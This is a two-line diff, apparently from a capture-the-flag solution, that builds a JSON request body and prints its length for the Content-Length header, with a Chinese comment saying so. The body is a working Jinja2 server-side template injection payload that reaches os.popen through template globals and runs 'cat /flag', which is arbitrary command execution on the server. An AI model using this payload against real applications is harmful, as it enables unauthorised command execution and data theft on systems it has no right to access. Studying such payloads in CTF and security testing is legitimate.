@@ -1,0 +1,2 @@
+body = '{"template": "{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen(\'cat /flag\').read() }}"}'
+print(len(body))  # 这就是 Content-Length 的值
